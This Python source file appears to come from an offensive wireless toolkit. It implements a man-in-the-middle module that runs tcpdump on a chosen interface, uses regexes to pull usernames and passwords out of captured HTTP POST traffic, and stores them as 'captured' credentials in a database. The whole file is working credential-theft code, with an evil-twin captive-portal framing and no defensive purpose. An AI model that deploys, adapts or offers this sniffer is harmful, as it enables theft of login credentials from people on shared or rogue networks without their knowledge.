import asyncio
import os
import re
from typing import Any, Optional, Dict
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.db.session import SessionLocal
from wcarck.db.models import Credential, SessionLog
from sqlalchemy import select
from datetime import datetime, timezone
import structlog

logger = structlog.get_logger()

class MITMModule(Module):
    """
    MITM Credential Extraction Module.
    Sniffs cleartext HTTP traffic and DNS queries from connected clients
    and funnels extracted credentials into the database.
    """

    def __init__(self):
        self._process: Optional[ManagedProcess] = None
        self._parser_task: Optional[asyncio.Task] = None
        self._running = False
        self._iface: Optional[str] = None
        self._credentials_found: list = []

    @property
    def name(self) -> str:
        return "attack.mitm"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface")
        if not iface:
            raise ValueError("Interface is required for MITM")

        self.iface = iface
        self._running = True

        bus.publish("module.started", {
            "job_id": job_id, "module": self.name,
            "message": f"MITM sniffing active on {iface}"
        })

        if os.name == 'nt':
            self._process = ManagedProcess(
                cmd=["python", "-c",
                     "import time; print('HTTP POST user=admin password=s3cret host=192.168.1.50'); "
                     "time.sleep(1); print('DNS query: evil-twin.local -> 10.0.0.1'); "
                     "time.sleep(1); print('HTTP POST user=john password=pass123 host=10.0.0.1'); "
                     "time.sleep(5)"],
                job_id=job_id
            )
            await self._process.start()
        else:
            cmd = [
                "tcpdump", "-i", iface, "-l", "-n",
                "-s", "0",
                "tcp port 80 or tcp port 8080 or tcp port 443 or udp port 53",
                "-A"
            ]
            self._process = ManagedProcess(cmd=cmd, job_id=job_id)
            try:
                await self._process.start()
            except Exception as e:
                bus.publish("module.error", {
                    "job_id": job_id, "module": self.name,
                    "message": f"Failed to start MITM sniffer: {e}",
                    "level": "ERROR"
                })
                self._running = False
                return

        self._parser_task = asyncio.create_task(self._parse_traffic(job_id))

    async def _parse_traffic(self, job_id: str):
        if not self._process or not self._process._process:
            return

        proc = self._process._process
        user_regex = re.compile(
            r'([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|'
            r'[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;\s]*)'
        )
        pass_regex = re.compile(
            r'([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|'
            r'[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;\s]*)'
        )
        dns_regex = re.compile(r'(\S+)\s+A\s+(\S+)')

        current_url = ""
        current_host = ""
        post_buffer = b""

        while self._running:
            try:
                line_bytes = await asyncio.wait_for(proc.stdout.readline(), timeout=2.0)
                if not line_bytes:
                    break
                line_str = line_bytes.decode("utf-8", errors="ignore").strip()

                if line_str.startswith("POST") or line_str.startswith("GET"):
                    parts = line_str.split()
                    if len(parts) >= 2:
                        current_url = parts[1]

                host_match = re.search(r'Host:\s*(\S+)', line_str)
                if host_match:
                    current_host = host_match.group(1)

                username_match = user_regex.search(line_str)
                password_match = pass_regex.search(line_str)

                if username_match and password_match:
                    username = username_match.group(2)
                    password = password_match.group(2)

                    if username and password and len(password) > 0:
                        await self._save_credential(job_id, {
                            "username": username,
                            "password": password,
                            "url": current_url,
                            "host": current_host,
                            "source": "http_sniff",
                            "client_ip": ""
                        })

                dns_match = dns_regex.search(line_str)
                if dns_match:
                    domain = dns_match.group(1)
                    ip = dns_match.group(2)
                    if ip != "0.0.0.0" and "." in ip:
                        bus.publish("job.progress", {
                            "job_id": job_id, "module": self.name,
                            "status_message": f"DNS: {domain} -> {ip}"
                        })

            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logger.debug(f"MITM parse error: {e}")
                continue

        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})
        self._running = False

    async def _save_credential(self, job_id: str, data: Dict[str, Any]):
        try:
            async with SessionLocal() as session:
                cred = Credential(
                    network_ssid=data.get("host", "Unknown"),
                    bssid="",
                    password=data["password"],
                    client_mac="FF:FF:FF:FF:FF:FF",
                    validated=True,
                    username=data.get("username", ""),
                    type="portal",
                    captured_at=datetime.now(timezone.utc).replace(tzinfo=None)
                )
                session.add(cred)
                await session.flush()

                log = SessionLog(
                    action="mitm_credential",
                    target=data.get("host", ""),
                    result="captured",
                    detail={
                        "username": data.get("username", ""),
                        "url": data.get("url", ""),
                        "source": data.get("source", "http_sniff")
                    }
                )
                session.add(log)
                await session.commit()

                bus.publish("credential.captured", {
                    "id": cred.id,
                    "ssid": data.get("host", "Unknown"),
                    "bssid": "",
                    "password": data["password"],
                    "source": "mitm"
                })

                logger.info(f"MITM captured credential: {data.get('username', '?')}@{data.get('host', '?')}")

        except Exception as e:
            logger.error(f"Failed to save MITM credential: {e}")

    async def stop(self, job_id: str) -> None:
        self._running = False
        if self._parser_task:
            self._parser_task.cancel()
            try:
                await self._parser_task
            except asyncio.CancelledError:
                pass
        if self._process:
            await self._process.stop()
            self._process = None

        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        return {
            "is_running": self._running,
            "module": self.name,
            "iface": self._iface,
            "credentials_found": len(self._credentials_found)
        }
